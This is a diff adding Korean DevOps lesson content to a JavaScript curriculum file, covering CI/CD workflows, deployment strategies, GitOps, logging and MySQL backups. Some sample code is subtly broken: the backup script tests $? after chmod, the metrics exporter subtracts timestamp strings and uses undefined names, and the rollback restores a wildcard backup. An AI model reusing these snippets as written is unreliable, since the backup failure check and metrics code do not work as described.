+        uses: actions/setup-node@v3
+        with:
+          node-version: '18'
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: Run tests
+        run: npm test
+
+      - name: Build
+        run: npm run build`
+                    },
+                    {
+                      label: "동작 확인",
+                      code: `# 1. 위 파일을 Git에 커밋
+git add .github/workflows/ci.yml
+git commit -m "Add CI workflow"
+git push
+
+# 2. GitHub 웹사이트에서 확인
+# Repository → Actions 탭
+# 워크플로우 실행 상태 확인
+
+# 3. 결과:
+✓ Checkout code (1s)
+✓ Setup Node.js (3s)
+✓ Install dependencies (15s)
+✓ Run tests (5s)
+✓ Build (8s)
+
+Total: 32s`
+                    }
+                  ]
+                },
+                {
+                  heading: "4. 자동 배포 추가",
+                  code: `# .github/workflows/deploy.yml
+name: Deploy
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: '18'
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: Build
+        run: npm run build
+
+      - name: Deploy to server
+        uses: appleboy/ssh-action@master
+        with:
+          host: \${{ secrets.SERVER_HOST }}
+          username: \${{ secrets.SERVER_USER }}
+          key: \${{ secrets.SSH_PRIVATE_KEY }}
+          script: |
+            cd /var/www/myapp
+            git pull origin main
+            npm install
+            npm run build
+            pm2 restart myapp
+
+# GitHub Secrets 설정:
+# Repository → Settings → Secrets and variables → Actions
+# - SERVER_HOST: your-server-ip
+# - SERVER_USER: root
+# - SSH_PRIVATE_KEY: (복사한 SSH 키)`
+                },
+                {
+                  heading: "5. 실패 시 알림 받기",
+                  code: `# Slack 알림 추가
+- name: Notify Slack on failure
+  if: failure()
+  uses: slackapi/slack-github-action@v1
+  with:
+    payload: |
+      {
+        "text": "❌ Deployment failed for ${{ github.repository }}",
+        "blocks": [
+          {
+            "type": "section",
+            "text": {
+              "type": "mrkdwn",
+              "text": "Commit: ${{ github.sha }}\\nAuthor: ${{ github.actor }}"
+            }
+          }
+        ]
+      }
+  env:
+    SLACK_WEBHOOK_URL: \${{ secrets.SLACK_WEBHOOK }}
+
+# Slack Webhook 설정:
+# 1. Slack에서 Incoming Webhooks 앱 추가
+# 2. Webhook URL 복사
+# 3. GitHub Secrets에 SLACK_WEBHOOK 추가`
+                },
+                {
+                  heading: "6. 환경별 배포 (Staging/Production)",
+                  code: `# .github/workflows/deploy-staging.yml
+name: Deploy to Staging
+
+on:
+  push:
+    branches: [develop]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      # ... (빌드 단계)
+      - name: Deploy to Staging
+        uses: appleboy/ssh-action@master
+        with:
+          host: \${{ secrets.STAGING_HOST }}
+          script: |
+            cd /var/www/myapp-staging
+            git pull origin develop
+            # ...
+
+# .github/workflows/deploy-production.yml
+name: Deploy to Production
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment: production # 수동 승인 필요
+    steps:
+      # ... (빌드 단계)
+      - name: Deploy to Production
+        uses: appleboy/ssh-action@master
+        with:
+          host: \${{ secrets.PROD_HOST }}
+          script: |
+            cd /var/www/myapp
+            git pull origin main
+            # ...
+
+# 환경 보호 설정:
+# Repository → Settings → Environments → New environment
+# Name: production
+# Required reviewers: (팀원 선택)
+# → main 브랜치 push 시 수동 승인 후 배포`
+                },
+                {
+                  heading: "💡 초급 실습 과제",
+                  checklist: [
+                    "GitHub Actions로 CI 워크플로우 작성 (테스트 + 빌드)",
+                    "테스트 실패 시 워크플로우가 중단되는지 확인",
+                    "자동 배포 워크플로우 추가하여 main 브랜치 push 시 서버 배포",
+                    "Slack 알림 설정하여 배포 실패 시 알림 수신",
+                    "Staging과 Production 환경 분리하여 각각 자동 배포"
+                  ]
+                }
+              ]
+            },
+            intermediate: {
+              title: "중급: 고급 배포 전략과 롤백",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "Blue-Green 배포, Canary 배포 등 고급 배포 전략을 이해하고 구현할 수 있다."
+                },
+                {
+                  heading: "1. Blue-Green 배포",
+                  content: "두 개의 동일한 환경을 준비하여 무중단 배포를 구현합니다.",
+                  code: `# docker-compose.yml
+version: '3.8'
+services:
+  app-blue:
+    image: myapp:blue
+    container_name: app-blue
+    ports:
+      - "3001:3000"
+    environment:
+      - COLOR=blue
+
+  app-green:
+    image: myapp:green
+    container_name: app-green
+    ports:
+      - "3002:3000"
+    environment:
+      - COLOR=green
+
+  nginx:
+    image: nginx:alpine
+    ports:
+      - "80:80"
+    volumes:
+      - ./nginx.conf:/etc/nginx/nginx.conf
+
+# nginx.conf
+upstream backend {
+  server app-blue:3000;  # 현재 활성화된 환경
+  # server app-green:3000;
+}
+
+server {
+  listen 80;
+  location / {
+    proxy_pass http://backend;
+  }
+}
+
+# 배포 스크립트
+#!/bin/bash
+# deploy-blue-green.sh
+
+CURRENT=$(curl -s http://localhost/api/version | jq -r '.env')
+
+if [ "$CURRENT" == "blue" ]; then
+  # Green에 새 버전 배포
+  docker-compose up -d app-green
+  sleep 5  # 헬스 체크 대기
+
+  # 헬스 체크
+  if curl -f http://localhost:3002/health; then
+    # Nginx 설정 변경 (blue → green)
+    sed -i 's/app-blue/app-green/' nginx.conf
+    docker-compose restart nginx
+
+    echo "Switched to green"
+    # Blue 환경 정리
+    docker-compose stop app-blue
+  else
+    echo "Health check failed, rollback"
+    docker-compose stop app-green
+  fi
+else
+  # Blue에 새 버전 배포 (동일한 로직)
+  # ...
+fi`
+                },
+                {
+                  heading: "2. Canary 배포 (점진적 배포)",
+                  code: `# nginx.conf (가중치 기반 라우팅)
+upstream backend {
+  server app-v1:3000 weight=9;  # 90% 트래픽
+  server app-v2:3000 weight=1;  # 10% 트래픽
+}
+
+# 단계별 증가
+# Step 1: 10% → weight=1
+# Step 2: 25% → weight=3
+# Step 3: 50% → weight=5
+# Step 4: 100% → weight=10 (v1 제거)
+
+# GitHub Actions 워크플로우
+name: Canary Deployment
+
+on:
+  workflow_dispatch:
+    inputs:
+      traffic_percentage:
+        description: 'Traffic percentage for new version'
+        required: true
+        default: '10'
+
+jobs:
+  canary-deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Deploy new version
+        run: |
+          ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
+            docker-compose up -d app-v2
+
+            # Nginx 가중치 변경
+            WEIGHT=\${{ github.event.inputs.traffic_percentage }}
+            OLD_WEIGHT=$((100 - WEIGHT))
+
+            sed -i "s/weight=.* # v1/weight=$OLD_WEIGHT # v1/" nginx.conf
+            sed -i "s/weight=.* # v2/weight=$WEIGHT # v2/" nginx.conf
+
+            docker-compose restart nginx
+          EOF
+
+      - name: Monitor metrics
+        run: |
+          sleep 300  # 5분 모니터링
+
+          ERROR_RATE=$(curl -s https://your-app.com/metrics | jq '.error_rate')
+
+          if (( $(echo "$ERROR_RATE > 0.05" | bc -l) )); then
+            echo "Error rate too high, rolling back"
+            ssh ... << 'EOF'
+              sed -i "s/weight=.* # v1/weight=100 # v1/" nginx.conf
+              sed -i "s/weight=.* # v2/weight=0 # v2/" nginx.conf
+              docker-compose restart nginx
+            EOF
+            exit 1
+          fi`
+                },
+                {
+                  heading: "3. 자동 롤백 시스템",
+                  code: `# .github/workflows/deploy-with-rollback.yml
+name: Deploy with Auto Rollback
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Get current version
+        id: current
+        run: |
+          CURRENT=$(ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} 'cat /var/www/myapp/VERSION')
+          echo "version=$CURRENT" >> $GITHUB_OUTPUT
+
+      - name: Deploy new version
+        run: |
+          ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
+            cd /var/www/myapp
+            git pull origin main
+            npm install
+            npm run build
+            echo "${{ github.sha }}" > VERSION
+            pm2 restart myapp
+          EOF
+
+      - name: Health check
+        id: health
+        run: |
+          sleep 10
+          for i in {1..5}; do
+            if curl -f https://your-app.com/health; then
+              echo "healthy=true" >> $GITHUB_OUTPUT
+              exit 0
+            fi
+            sleep 5
+          done
+          echo "healthy=false" >> $GITHUB_OUTPUT
+
+      - name: Rollback on failure
+        if: steps.health.outputs.healthy != 'true'
+        run: |
+          echo "Health check failed, rolling back to \${{ steps.current.outputs.version }}"
+          ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
+            cd /var/www/myapp
+            git checkout \${{ steps.current.outputs.version }}
+            npm install
+            npm run build
+            pm2 restart myapp
+          EOF
+
+      - name: Notify
+        if: always()
+        uses: slackapi/slack-github-action@v1
+        with:
+          payload: |
+            {
+              "text": "${{ job.status == 'success' && '✅' || '❌' }} Deployment ${{ job.status }}",
+              "blocks": [
+                {
+                  "type": "section",
+                  "text": {
+                    "type": "mrkdwn",
+                    "text": "Commit: ${{ github.sha }}\\nHealth: ${{ steps.health.outputs.healthy }}"
+                  }
+                }
+              ]
+            }
+        env:
+          SLACK_WEBHOOK_URL: \${{ secrets.SLACK_WEBHOOK }}`
+                },
+                {
+                  heading: "4. Docker 이미지 버전 관리",
+                  code: `# .github/workflows/build-and-push.yml
+name: Build and Push Docker Image
+
+on:
+  push:
+    branches: [main]
+    tags:
+      - 'v*'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v2
+
+      - name: Login to Docker Hub
+        uses: docker/login-action@v2
+        with:
+          username: \${{ secrets.DOCKER_USERNAME }}
+          password: \${{ secrets.DOCKER_PASSWORD }}
+
+      - name: Extract metadata
+        id: meta
+        uses: docker/metadata-action@v4
+        with:
+          images: myusername/myapp
+          tags: |
+            type=ref,event=branch
+            type=semver,pattern={{version}}
+            type=sha
+
+      - name: Build and push
+        uses: docker/build-push-action@v4
+        with:
+          context: .
+          push: true
+          tags: \${{ steps.meta.outputs.tags }}
+          labels: \${{ steps.meta.outputs.labels }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
+# 결과:
+# main 브랜치 push → myapp:main
+# v1.2.3 태그 → myapp:v1.2.3, myapp:1.2, myapp:1
+# git sha abc123 → myapp:sha-abc123`
+                },
+                {
+                  heading: "5. 데이터베이스 마이그레이션 자동화",
+                  code: `# .github/workflows/deploy-with-migration.yml
+- name: Run database migrations
+  run: |
+    ssh \${{ secrets.SERVER_USER }}@\${{ secrets.SERVER_HOST }} << 'EOF'
+      cd /var/www/myapp
+
+      # 백업 먼저
+      mysqldump -u root -p\$DB_PASSWORD mydb > backup_$(date +%Y%m%d_%H%M%S).sql
+
+      # 마이그레이션 실행
+      npm run migrate
+
+      # 실패 시 롤백
+      if [ $? -ne 0 ]; then
+        echo "Migration failed, restoring backup"
+        mysql -u root -p\$DB_PASSWORD mydb < backup_*.sql
+        exit 1
+      fi
+    EOF
+
+# package.json
+{
+  "scripts": {
+    "migrate": "npx sequelize-cli db:migrate",
+    "migrate:undo": "npx sequelize-cli db:migrate:undo"
+  }
+}
+
+# migrations/20240101000000-add-column.js
+module.exports = {
+  up: async (queryInterface, Sequelize) => {
+    await queryInterface.addColumn('users', 'phone', {
+      type: Sequelize.STRING,
+      allowNull: true
+    });
+  },
+
+  down: async (queryInterface, Sequelize) => {
+    await queryInterface.removeColumn('users', 'phone');
+  }
+};`
+                },
+                {
+                  heading: "⚡ 중급 실습 과제",
+                  checklist: [
+                    "Blue-Green 배포 구현 후 무중단 배포 성공 확인",
+                    "Canary 배포로 10% → 50% → 100% 점진적 배포 실행",
+                    "헬스 체크 실패 시 자동 롤백되는지 테스트",
+                    "Docker 이미지에 Git SHA 태그 자동 추가하여 버전 추적",
+                    "데이터베이스 마이그레이션 실패 시 자동으로 백업 복원"
+                  ]
+                }
+              ]
+            },
+            advanced: {
+              title: "고급: GitOps와 멀티 클러스터 배포",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "GitOps 방식으로 선언적 배포를 구현하고, Kubernetes에서 고급 배포 전략을 사용할 수 있다."
+                },
+                {
+                  heading: "1. ArgoCD로 GitOps 구현",
+                  code: `# Kubernetes 매니페스트를 Git으로 관리
+# k8s/deployment.yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: myapp
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: myapp
+  template:
+    metadata:
+      labels:
+        app: myapp
+        version: v1.2.3
+    spec:
+      containers:
+      - name: myapp
+        image: myusername/myapp:v1.2.3
+        ports:
+        - containerPort: 3000
+
+# ArgoCD Application 정의
+# argocd/application.yaml
+apiVersion: argoproj.io/v1alpha1
+kind: Application
+metadata:
+  name: myapp
+  namespace: argocd
+spec:
+  project: default
+  source:
+    repoURL: https://github.com/myuser/myapp-k8s
+    targetRevision: main
+    path: k8s
+  destination:
+    server: https://kubernetes.default.svc
+    namespace: production
+  syncPolicy:
+    automated:
+      prune: true
+      selfHeal: true
+    syncOptions:
+    - CreateNamespace=true
+
+# 배포 프로세스:
+# 1. Git에 k8s/deployment.yaml 업데이트 (이미지 버전 변경)
+# 2. ArgoCD가 자동으로 감지
+# 3. Kubernetes 클러스터에 적용
+# 4. 헬스 체크 후 완료
+
+# 설치:
+kubectl create namespace argocd
+kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml
+
+# 접속:
+kubectl port-forward svc/argocd-server -n argocd 8080:443`
+                },
+                {
+                  heading: "2. Kustomize로 환경별 설정 관리",
+                  code: `# 기본 설정
+# base/deployment.yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: myapp
+spec:
+  replicas: 2
+  template:
+    spec:
+      containers:
+      - name: myapp
+        image: myapp:latest
+        resources:
+          requests:
+            memory: "128Mi"
+            cpu: "100m"
+
+# Staging 환경 오버레이
+# overlays/staging/kustomization.yaml
+apiVersion: kustomize.config.k8s.io/v1beta1
+kind: Kustomization
+bases:
+- ../../base
+namePrefix: staging-
+replicas:
+- name: myapp
+  count: 1
+images:
+- name: myapp
+  newTag: staging-latest
+
+# Production 환경 오버레이
+# overlays/production/kustomization.yaml
+apiVersion: kustomize.config.k8s.io/v1beta1
+kind: Kustomization
+bases:
+- ../../base
+namePrefix: prod-
+replicas:
+- name: myapp
+  count: 5
+images:
+- name: myapp
+  newTag: v1.2.3
+patchesStrategicMerge:
+- resources.yaml
+
+# overlays/production/resources.yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: myapp
+spec:
+  template:
+    spec:
+      containers:
+      - name: myapp
+        resources:
+          requests:
+            memory: "512Mi"
+            cpu: "500m"
+          limits:
+            memory: "1Gi"
+            cpu: "1000m"
+
+# 적용:
+kubectl apply -k overlays/staging
+kubectl apply -k overlays/production`
+                },
+                {
+                  heading: "3. Flagger로 자동 Canary 배포",
+                  code: `# Flagger 설치
+kubectl apply -f https://raw.githubusercontent.com/fluxcd/flagger/main/artifacts/flagger/crd.yaml
+kubectl apply -f https://raw.githubusercontent.com/fluxcd/flagger/main/artifacts/flagger/deployment.yaml
+
+# Canary 정의
+# canary.yaml
+apiVersion: flagger.app/v1beta1
+kind: Canary
+metadata:
+  name: myapp
+  namespace: production
+spec:
+  targetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: myapp
+  service:
+    port: 80
+  analysis:
+    interval: 1m
+    threshold: 5
+    maxWeight: 50
+    stepWeight: 10
+    metrics:
+    - name: request-success-rate
+      thresholdRange:
+        min: 99
+      interval: 1m
+    - name: request-duration
+      thresholdRange:
+        max: 500
+      interval: 1m
+    webhooks:
+    - name: load-test
+      url: http://flagger-loadtester/
+      timeout: 5s
+      metadata:
+        cmd: "hey -z 1m -q 10 -c 2 http://myapp-canary/"
+
+# 동작:
+# 1. 새 버전 배포 감지
+# 2. Canary 파드 생성 (10% 트래픽)
+# 3. 1분간 메트릭 측정
+# 4. 성공률 99% 이상 & 응답 시간 500ms 이하면 → 20% 증가
+# 5. 실패하면 → 롤백
+# 6. 50%까지 증가 후 전체 전환`
+                },
+                {
+                  heading: "4. 멀티 클러스터 배포",
+                  code: `# Flux로 여러 클러스터 관리
+# clusters/staging/flux-system/gotk-sync.yaml
+apiVersion: source.toolkit.fluxcd.io/v1beta2
+kind: GitRepository
+metadata:
+  name: flux-system
+  namespace: flux-system
+spec:
+  interval: 1m
+  url: https://github.com/myuser/fleet-infra
+  ref:
+    branch: main
+
+# clusters/staging/apps/myapp.yaml
+apiVersion: kustomize.toolkit.fluxcd.io/v1beta2
+kind: Kustomization
+metadata:
+  name: myapp
+  namespace: flux-system
+spec:
+  interval: 5m
+  path: ./apps/myapp/overlays/staging
+  sourceRef:
+    kind: GitRepository
+    name: flux-system
+
+# clusters/production-us/apps/myapp.yaml
+apiVersion: kustomize.toolkit.fluxcd.io/v1beta2
+kind: Kustomization
+metadata:
+  name: myapp
+  namespace: flux-system
+spec:
+  interval: 5m
+  path: ./apps/myapp/overlays/production-us
+  sourceRef:
+    kind: GitRepository
+    name: flux-system
+
+# clusters/production-eu/apps/myapp.yaml
+apiVersion: kustomize.toolkit.fluxcd.io/v1beta2
+kind: Kustomization
+metadata:
+  name: myapp
+  namespace: flux-system
+spec:
+  interval: 5m
+  path: ./apps/myapp/overlays/production-eu
+  sourceRef:
+    kind: GitRepository
+    name: flux-system
+
+# 배포 프로세스:
+# 1. Git에 앱 매니페스트 업데이트
+# 2. Flux가 모든 클러스터에서 감지
+# 3. Staging → Production-US → Production-EU 순차 배포
+# 4. 각 클러스터별로 Canary 배포 자동 실행`
+                },
+                {
+                  heading: "5. 배포 승인 워크플로우",
+                  code: `# GitHub Actions with manual approval
+name: Production Deployment
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Build image
+        run: docker build -t myapp:${{ github.sha }} .
+      - name: Push image
+        run: docker push myapp:${{ github.sha }}
+
+  request-approval:
+    needs: build
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create pull request
+        uses: peter-evans/create-pull-request@v5
+        with:
+          title: "Deploy ${{ github.sha }} to production"
+          body: |
+            ## Deployment Request
+            - Commit: ${{ github.sha }}
+            - Author: ${{ github.actor }}
+            - Tests: Passed ✅
+
+            Please review and approve to deploy to production.
+          branch: deploy/${{ github.sha }}
+          base: main
+
+  deploy-production:
+    needs: request-approval
+    runs-on: ubuntu-latest
+    environment:
+      name: production
+      url: https://myapp.com
+    steps:
+      - name: Update k8s manifest
+        run: |
+          git clone https://github.com/myuser/myapp-k8s
+          cd myapp-k8s
+          sed -i 's|image: myapp:.*|image: myapp:${{ github.sha }}|' k8s/deployment.yaml
+          git commit -am "Deploy ${{ github.sha }}"
+          git push
+
+      - name: Wait for ArgoCD sync
+        run: |
+          argocd app wait myapp --timeout 600
+
+      - name: Smoke test
+        run: |
+          curl -f https://myapp.com/health || exit 1`
+                },
+                {
+                  heading: "6. 배포 메트릭과 SLO 추적",
+                  code: `# Prometheus로 배포 메트릭 수집
+# deployment-exporter.yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: deployment-exporter
+spec:
+  template:
+    spec:
+      containers:
+      - name: exporter
+        image: deployment-exporter:latest
+        env:
+        - name: GITHUB_TOKEN
+          valueFrom:
+            secretKeyRef:
+              name: github-token
+              key: token
+
+# Python 스크립트 (deployment-exporter)
+import requests
+from prometheus_client import start_http_server, Gauge
+import time
+
+DEPLOYMENT_FREQUENCY = Gauge('deployment_frequency', 'Deployments per day')
+LEAD_TIME = Gauge('deployment_lead_time_seconds', 'Time from commit to deploy')
+MTTR = Gauge('deployment_mttr_seconds', 'Mean time to recovery')
+CHANGE_FAILURE_RATE = Gauge('deployment_change_failure_rate', 'Failed deployments %')
+
+def collect_metrics():
+    # GitHub API로 배포 정보 수집
+    response = requests.get(
+        'https://api.github.com/repos/myuser/myapp/actions/runs',
+        headers={'Authorization': f'token {GITHUB_TOKEN}'}
+    )
+
+    runs = response.json()['workflow_runs']
+
+    # 배포 빈도 계산
+    deployments_today = len([r for r in runs if is_today(r['created_at'])])
+    DEPLOYMENT_FREQUENCY.set(deployments_today)
+
+    # Lead Time 계산
+    for run in runs:
+        if run['conclusion'] == 'success':
+            lead_time = (run['updated_at'] - run['created_at']).total_seconds()
+            LEAD_TIME.set(lead_time)
+            break
+
+if __name__ == '__main__':
+    start_http_server(8000)
+    while True:
+        collect_metrics()
+        time.sleep(60)
+
+# Grafana 대시보드
+# 1. Deployment Frequency: 하루 평균 배포 횟수
+# 2. Lead Time: 커밋부터 배포까지 평균 시간
+# 3. MTTR: 장애 복구 평균 시간
+# 4. Change Failure Rate: 배포 실패율`
+                },
+                {
+                  heading: "⚡ 고급 실습 과제",
+                  checklist: [
+                    "ArgoCD로 GitOps 구현 후 Git push만으로 배포 자동화",
+                    "Kustomize로 Staging/Production 환경 분리하여 각각 다른 설정 적용",
+                    "Flagger로 Canary 배포 자동화 (성공률 99% 이상일 때만 진행)",
+                    "3개 클러스터 (Staging, US, EU)에 순차 배포 구현",
+                    "배포 메트릭 (빈도, Lead Time, MTTR) Prometheus + Grafana로 추적"
+                  ]
+                }
+              ]
+            }
+          }
         },
         {
           id: '4-2',
@@ -2756,7 +6810,213 @@ groups:
           goal: '로그를 체계적으로 관리하고 인사이트를 얻을 수 있다',
           hours: 12,
           keywords: ['log management', 'centralized logging', 'log analysis'],
-          tasks: []
+          tasks: [
+            '중앙 집중식 로그 시스템 구축',
+            '로그 검색 및 분석',
+            '알림 규칙 설정'
+          ],
+          content: {
+            beginner: {
+              title: "초급: 구조화된 로깅과 기본 분석",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "구조화된 로그를 작성하고, 로그 레벨을 적절히 사용할 수 있다."
+                },
+                {
+                  heading: "1. 좋은 로그 vs 나쁜 로그",
+                  code: `// 나쁜 로그
+console.log("Error");
+console.log("User logged in");
+console.log("Data:", data);
+
+// 좋은 로그 (Winston 사용)
+const winston = require('winston');
+
+const logger = winston.createLogger({
+  format: winston.format.combine(
+    winston.format.timestamp(),
+    winston.format.json()
+  ),
+  transports: [
+    new winston.transports.File({ filename: 'app.log' })
+  ]
+});
+
+logger.error('Database connection failed', {
+  error: err.message,
+  userId: req.user.id,
+  timestamp: new Date().toISOString()
+});
+
+logger.info('User login successful', {
+  userId: user.id,
+  ip: req.ip,
+  userAgent: req.headers['user-agent']
+});`
+                },
+                {
+                  heading: "2. 로그 레벨 활용",
+                  code: `// ERROR: 즉시 조치 필요
+logger.error('Payment processing failed', {
+  orderId: 12345,
+  amount: 100,
+  error: 'Gateway timeout'
+});
+
+// WARN: 주의 필요
+logger.warn('API rate limit approaching', {
+  remaining: 10,
+  limit: 100
+});
+
+// INFO: 중요 이벤트
+logger.info('Order completed', {
+  orderId: 12345,
+  userId: 789
+});
+
+// DEBUG: 개발 디버깅용
+logger.debug('Query executed', {
+  sql: 'SELECT * FROM users WHERE id = ?',
+  params: [123],
+  duration: '15ms'
+});`
+                },
+                {
+                  heading: "💡 초급 실습 과제",
+                  checklist: [
+                    "Winston으로 구조화된 로그 시스템 구축",
+                    "로그 레벨별로 다른 파일에 저장 (error.log, combined.log)",
+                    "요청/응답 미들웨어로 모든 API 호출 로깅"
+                  ]
+                }
+              ]
+            },
+            intermediate: {
+              title: "중급: 중앙 집중식 로그 시스템 (ELK Stack)",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "Elasticsearch + Kibana로 로그를 중앙에서 관리하고 검색할 수 있다."
+                },
+                {
+                  heading: "1. Docker Compose로 ELK Stack 구성",
+                  code: `# docker-compose.yml
+version: '3.8'
+services:
+  elasticsearch:
+    image: elasticsearch:8.11.0
+    environment:
+      - discovery.type=single-node
+      - xpack.security.enabled=false
+    ports:
+      - "9200:9200"
+
+  kibana:
+    image: kibana:8.11.0
+    ports:
+      - "5601:5601"
+    environment:
+      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
+
+  logstash:
+    image: logstash:8.11.0
+    volumes:
+      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
+    ports:
+      - "5000:5000"
+
+# logstash.conf
+input {
+  tcp {
+    port => 5000
+    codec => json
+  }
+}
+
+output {
+  elasticsearch {
+    hosts => ["elasticsearch:9200"]
+    index => "app-logs-%{+YYYY.MM.dd}"
+  }
+}`
+                },
+                {
+                  heading: "2. 애플리케이션에서 Logstash로 전송",
+                  code: `const winston = require('winston');
+require('winston-logstash');
+
+const logger = winston.createLogger({
+  transports: [
+    new winston.transports.Logstash({
+      port: 5000,
+      host: 'localhost',
+      node_name: 'my-app'
+    })
+  ]
+});
+
+logger.info('User action', {
+  userId: 123,
+  action: 'purchase',
+  amount: 100
+});`
+                },
+                {
+                  heading: "⚡ 중급 실습 과제",
+                  checklist: [
+                    "ELK Stack Docker Compose로 구축",
+                    "애플리케이션 로그를 Logstash로 전송",
+                    "Kibana에서 실시간 로그 검색 및 대시보드 생성"
+                  ]
+                }
+              ]
+            },
+            advanced: {
+              title: "고급: 분산 추적과 로그 상관관계",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "OpenTelemetry로 분산 추적을 구현하고, 로그와 트레이스를 연결할 수 있다."
+                },
+                {
+                  heading: "1. OpenTelemetry 통합",
+                  code: `const { NodeSDK } = require('@opentelemetry/sdk-node');
+const { getNodeAutoInstrumentations } = require('@opentelemetry/auto-instrumentations-node');
+const { JaegerExporter } = require('@opentelemetry/exporter-jaeger');
+
+const sdk = new NodeSDK({
+  traceExporter: new JaegerExporter({
+    endpoint: 'http://localhost:14268/api/traces',
+  }),
+  instrumentations: [getNodeAutoInstrumentations()],
+});
+
+sdk.start();
+
+// 로그와 Trace ID 연결
+const trace = require('@opentelemetry/api').trace;
+
+app.use((req, res, next) => {
+  const span = trace.getActiveSpan();
+  const traceId = span?.spanContext().traceId;
+
+  req.logger = logger.child({ traceId });
+  next();
+});`
+                },
+                {
+                  heading: "⚡ 고급 실습 과제",
+                  checklist: [
+                    "OpenTelemetry + Jaeger로 분산 추적 구현",
+                    "로그에 Trace ID 포함하여 요청 전체 추적",
+                    "Grafana Loki로 로그 집계 및 알림 설정"
+                  ]
+                }
+              ]
+            }
+          }
         },
         {
           id: '4-3',
@@ -2764,7 +7024,728 @@ groups:
           goal: '데이터베이스를 전문적으로 관리할 수 있다',
           hours: 20,
           keywords: ['database replication', 'sharding', 'high availability'],
-          tasks: []
+          tasks: [
+            'Master-Slave 복제 구성',
+            '데이터베이스 백업 자동화',
+            '고가용성 클러스터 구축'
+          ],
+          content: {
+            beginner: {
+              title: "초급: 데이터베이스 백업과 복구 전략",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "정기적인 백업을 자동화하고, 다양한 복구 시나리오를 처리할 수 있다."
+                },
+                {
+                  heading: "1. 백업 전략의 중요성",
+                  content: "데이터 손실은 서비스 종료로 이어질 수 있습니다.",
+                  list: [
+                    "하드웨어 고장: SSD/HDD 장애로 데이터 소실",
+                    "인적 오류: DROP TABLE 실수로 테이블 삭제",
+                    "보안 사고: 랜섬웨어 공격으로 DB 암호화",
+                    "자연재해: 데이터센터 화재/침수"
+                  ]
+                },
+                {
+                  heading: "2. 3-2-1 백업 규칙",
+                  code: `# 3-2-1 백업 전략
+3: 데이터의 복사본 3개 유지
+2: 서로 다른 2가지 매체에 저장 (HDD + SSD, 로컬 + 클라우드)
+1: 1개는 오프사이트(원격지)에 보관
+
+# 예시:
+- 원본: 운영 서버 MySQL (로컬 SSD)
+- 백업 1: 같은 서버 다른 디스크 (로컬 HDD)
+- 백업 2: AWS S3 (클라우드)
+- 백업 3: 다른 리전 S3 (재해 복구용)`
+                },
+                {
+                  heading: "3. mysqldump로 전체 백업",
+                  code: `#!/bin/bash
+# full-backup.sh
+
+DATE=$(date +%Y%m%d_%H%M%S)
+BACKUP_DIR="/var/backups/mysql"
+DB_NAME="mydb"
+RETENTION_DAYS=7
+
+# 백업 디렉토리 생성
+mkdir -p $BACKUP_DIR
+
+# MySQL 전체 백업 (압축)
+mysqldump -u root -p\${MYSQL_PASSWORD} \\
+  --single-transaction \\
+  --quick \\
+  --lock-tables=false \\
+  \${DB_NAME} | gzip > \${BACKUP_DIR}/\${DB_NAME}_\${DATE}.sql.gz
+
+# 백업 파일 권한 설정
+chmod 600 \${BACKUP_DIR}/\${DB_NAME}_\${DATE}.sql.gz
+
+# 백업 성공 확인
+if [ $? -eq 0 ]; then
+  echo "[\$(date)] Backup successful: \${DB_NAME}_\${DATE}.sql.gz" >> /var/log/mysql-backup.log
+else
+  echo "[\$(date)] Backup failed!" >> /var/log/mysql-backup.log
+  # Slack 알림
+  curl -X POST \${SLACK_WEBHOOK} -d '{"text":"❌ DB Backup Failed!"}'
+  exit 1
+fi
+
+# 오래된 백업 삭제 (7일 이상)
+find \${BACKUP_DIR} -name "*.sql.gz" -mtime +\${RETENTION_DAYS} -delete
+
+# S3 업로드
+aws s3 cp \${BACKUP_DIR}/\${DB_NAME}_\${DATE}.sql.gz \\
+  s3://my-backup-bucket/mysql/\${DATE}/ \\
+  --storage-class STANDARD_IA
+
+echo "[\$(date)] Backup uploaded to S3" >> /var/log/mysql-backup.log`
+                },
+                {
+                  heading: "4. Cron으로 자동화",
+                  code: `# Crontab 편집
+crontab -e
+
+# 매일 새벽 3시 전체 백업
+0 3 * * * /var/scripts/full-backup.sh
+
+# 매주 일요일 새벽 4시 다른 리전으로 복사
